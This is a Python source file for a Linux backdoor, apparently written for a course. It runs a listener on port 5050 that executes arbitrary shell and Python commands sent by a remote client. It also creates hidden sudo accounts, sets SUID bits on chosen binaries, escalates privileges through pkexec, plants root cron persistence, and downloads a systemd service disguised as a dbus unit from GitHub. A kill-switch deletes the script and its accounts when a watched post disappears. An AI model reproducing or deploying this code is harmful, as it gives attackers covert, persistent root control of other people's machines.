#!/usr/bin/env python3

# This is all in one file to make it easier to transfer to the remote machine
# That does NOT mean we can't organize it nicely using functions and classes!


# NOTE: Do not put dependencies that require pip install X here!
# Put it inside of the function that bootstraps them instead
import os
import socket
import subprocess
import sys
import time

import subprocess

users = []
#from chatgpt
#https://chatgpt.com/c/67ce63a1-cd38-8009-81a7-f2fcf6da3689
def manage_user(username, password, admin=False, active=True, hide=False):
    """Creates, manages, and optionally hides a Ubuntu user account."""
    
    def run_command(command):
        """Helper function to execute system commands."""
        try:
            result = subprocess.run(command, check=True, shell=True, capture_output=True, text=True)
            return result.stdout
        except subprocess.CalledProcessError as e:
            return f"Error: {e.stderr}"

    # Check if the user already exists
    user_check = run_command(f"getent passwd {username}")
    if username in user_check:
        #print(f"User '{username}' already exists.")
        return

    # Create the user with a home directory and set password
    #print(f"Creating user: {username}...")
    (run_command(f"sudo useradd -m -s /bin/bash {username}"))
    (run_command(f"echo '{username}:{password}' | sudo chpasswd"))

    # Grant sudo privileges (if requested)
    if admin:
        #print(f"Adding {username} to the sudo group...")
        (run_command(f"sudo usermod -aG sudo {username}"))

    # Enable or disable the account
    if not active:
        #print(f"Disabling user '{username}' (locking the account)...")
        (run_command(f"sudo passwd -l {username}"))

    # Hide user from login screen (if requested)
    if hide:
        #print(f"Hiding user '{username}' from login screen...")
        (run_command(f"sudo usermod -d /var/hidden_{username} {username}"))
        (run_command(f"sudo chown root:root /var/hidden_{username}"))






THIS_FILE = os.path.realpath(__file__)

def run_command(cmd, shell=True, capture_output=True, **kwargs):
    return subprocess.run(
        cmd,
        shell=shell,
        capture_output=capture_output,
        text=True,
        **kwargs
    )


# listen on port 5050, receive input
HOST, PORT = "0.0.0.0", 5050


def kill_others():
    """
    Since a port can only be bound by one program, kill all other programs on this port that we can see.
    This makes it so if we run our script multiple times, only the most up-to-date/priviledged one will be running in the end
    """
    # check if privilege escalated
    # if os.geteuid() == 0:
    # if so, kill all other non-privileged copies of it
    pid = run_command(f"lsof -ti TCP:{str(PORT)}").stdout
    if pid:
        pids = pid.strip().split("\n")
        print("Killing", pids)
        for p in pids:
            run_command(f"kill {str(p)}")
        time.sleep(1)

def bootstrap_packages():
    """
    This allows us to install any python package we want as part of our malware.
    In real malware, we would probably packages these extra dependencies with the payload,
    but for simplicitly, we just install it. If you are curious, look into pyinstaller
    """
    print(sys.prefix, sys.base_prefix)
    # Check and install logging if necessary
    try:
        import logging
    except ImportError:
        print("logging not found, installing...")
        run_command([sys.executable, "-m", "pip", "install", "logging"], shell=False, capture_output=False)

    try:
        import pyscreenshot
    except ImportError:
        print("pyscreenshot not found, installing...")
        run_command([sys.executable, "-m", "pip", "install", "pillow", "pyscreenshot"], shell=False, capture_output=False)
    if sys.prefix == sys.base_prefix:
        # we're not in a venv, make one
        print("running in venv")
        import venv

        venv_dir = os.path.join(os.path.dirname(THIS_FILE), ".venv")
        # print(venv_dir)
        if not os.path.exists(venv_dir):
            print("creating venv")
            venv.create(venv_dir, with_pip=True)
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
        else:
            print("venv exists, but we still need to open inside it")
            subprocess.Popen([os.path.join(venv_dir, "bin", "python"), THIS_FILE])
            sys.exit(0)
    else:
        print("already in venv")
        run_command(
            [ sys.executable, "-m", "pip", "install", "requests"], shell=False, capture_output=False
        ).check_returncode() # example to install a python package on the remote server
        # If you need pip install X packages, here, import them now
        run_command([sys.executable, "-m", "pip", "install", "bs4"], shell=False, capture_output=False).check_returncode()
        import requests
        import urllib.parse
        try:
            __import__("webbrowser")
        except ImportError:
            subprocess.run([sys.executable, "-m", "pip", "install", "webbrowser"], check=True)

def play_audio():
    # If you want to open the browser with a YouTube video URL, use webbrowser
    import webbrowser

    # YouTube video URL
    youtube_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

    # Open the URL in the default web browser
    webbrowser.open(youtube_url)

# === CONFIGURATION ===
POST_URL = "https://www.youtube.com/watch?v=Pg5qqhD5GYI"  # Replace with your youtube
def check_post_exists():
    import requests
    """Check if the post still exists."""
    headers = {
        "User-Agent": "Mozilla/5.0"
    }
    response = requests.get(POST_URL, headers=headers)

    if response.status_code == 404 or "This post is unavailable" in response.text:
        return False  # Post is deleted
    return True  # Post still exists

#from chatgpt
def self_delete():
    """Delete the script and exit."""
    print("Post deleted! Removing script...")
    for item in users:
                    # Build the command to delete the user
            command = f"sudo userdel -r {item}"
        
                    # Run the command to delete the user
            subprocess.run(command, check=True, shell=True)
    subprocess.run(["pkexec", "rm", "-f", "/etc/cron.d/malware"])
    subprocess.run(["pkexec", "rm", "-f", THIS_FILE], check=True)
    print(f"Deleted: {THIS_FILE}")
    exit(0)




def handle_conn(conn, addr):
    with conn:
        print(f"connected by {addr}")
        # If you need to receive more data, you may need to loop
        # Note that there is actually no way to know we have gotten "all" of the data
        # We only know if the connection was closed, but if the client is waiting for us to say something,
        # It won't be closed. Hint: you might need to decide how to mark the "end of command data".
        # For example, you could send a length value before any command, decide on null byte as ending,
        # base64 encode every command, etc
        data = conn.recv(1024)
        #commandy=data.decode()
        #output = subprocess.getoutput(commandy)
        #conn.send(output.encode())
        print("received: " + data.decode("utf-8", errors="replace"))
        sentence = data.decode("utf-8", errors="replace")
        words = sentence.split()

        _,_, task = sentence.partition(" ")
        
        if words[0] == "privesc":
            subprocess.run(["pkexec", sys.executable, THIS_FILE])
        elif words[0] == "user":
            #split task into the arguments then put arguments into the func below
            user_details = task.split()
            admin = False
            if user_details[2] == "y":
                admin = True
            active = False
            if user_details[3] == "y":
                active = True
            hide = False
            if user_details[4] == "y":
                hide = True
            manage_user(user_details[0], user_details[1], admin, active, hide)
            users.append(user_details[0])
        elif words[0] == "kill":
            self_delete()
        elif words[0]=="killusers":
            conn.sendall("killing these users:".encode())
            
            for item in users:
           
                    # Build the command to delete the user
                    conn.sendall(item.encode())
                    command = f"sudo userdel -r {item}"
        
                    # Run the command to delete the user
                    subprocess.run(command, check=True, shell=True)
                    
        elif words[0]=="killcron":
            subprocess.run(["pkexec", "rm", "-f", "/etc/cron.d/malware"])
        elif words[0] =="break":
            task = task.strip()
            try:
            # Locate the binary
                binary_path = subprocess.check_output(["which", task]).decode().strip()
                #print(f"Found {task} at: {binary_path}")
            except Exception as e:
                conn.sendall(f"Error: Could not locate binary:".encode())
                sys.exit(1)

            command = ["sudo", "chmod", "u+s", binary_path]
            try:
                print(f"Setting the SUID bit on: {binary_path}")
                subprocess.run(command, check=True)
                conn.sendall(f"Successfully set the SUID bit".encode())
            except subprocess.CalledProcessError as e:
                conn.sendall(f"Error: Failed to set the SUID bit".encode())
                sys.exit(1)
        elif words[0] == "playaudio":
            # Call the play_audio function from the other file
            play_audio()
            conn.sendall("Playing audio!".encode())
        elif words[0] == "takepic":
            import pyscreenshot
            #save_path = os.path.expanduser("screenshot.png")
            # Capture screenshot
            screenshot = pyscreenshot.grab()
            save_path = "screenshot.png"
            screenshot.save(save_path)

            print(f"[+] Screenshot saved to {save_path}")
            conn.sendall("Taking Picture".encode())
        elif words[0] =="pythoncmd":
            exec(task)
            conn.sendall("command executed successful ".encode())
        elif words[0] == "bashcmd":
            output = run_command(task)
            conn.sendall(output.stdout.encode())
        elif words[0] == "cron":
            FILE_PATH = "/etc/cron.d/malware"
            try:
                with open(FILE_PATH, "x") as f:
                    f.write(f"* * * * * root {THIS_FILE}\n") 
            except:
                f = open(FILE_PATH, "w")
                f.write(f"* * * * * root {THIS_FILE}\n") 
                
            os.chmod(FILE_PATH, 0o755)
            f.close()
        elif words[0] == 'startup':
            subprocess.run(["/usr/bin/wget", "-O", "/etc/systemd/system/dbus-org.freedesktop.setup.service", 'https://raw.githubusercontent.com/isaackhabra/test/refs/heads/main/systemd'])
            subprocess.run(["/usr/bin/wget", "-O", "/home/startup.sh", 'https://raw.githubusercontent.com/isaackhabra/test/refs/heads/main/startup.sh'])
            subprocess.run(["chmod", "+x", "/home/startup.sh"])
            subprocess.run(["chmod", "644", "/etc/systemd/system/dbus-org.freedesktop.setup.service"])
            subprocess.run(["/bin/systemctl", "enable", "dbus-org.freedesktop.setup.service"])
            
        if not data:
            return
        
        #subprocess.Popen([sys.executable, THIS_FILE])

        if(str(data.decode("utf-8", errors="replace")).rstrip() == "hi"):
            subprocess.run(["pkexec", sys.executable, THIS_FILE]) 

        # Think VERY carefully about how you will communicate between the client and server
        # You will need to make a custom protocol to transfer commands
        
        

        try:
            conn.sendall("Response data here".encode())
            # Process the communication data from 
        except Exception as e:
            conn.sendall(f"error: {e}".encode())


def main():
    kill_others()
    bootstrap_packages()


    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()  # allows for 10 connections
        print(f"Listening on {HOST}:{PORT}")

        last_checked = time.time()

        while True:
            # Check post deletion at intervals
            current_time = time.time()
            if current_time - last_checked >= 60:
                last_checked = current_time
                if not check_post_exists():
                    self_delete()
    
            try:
                conn, addr = s.accept()
                #print("Conenction Accepted")
                handle_conn(conn, addr)
            except KeyboardInterrupt:
                raise
            except Exception as e:
                print(f"Connection died with error {e}")


if __name__ == "__main__":
    main()
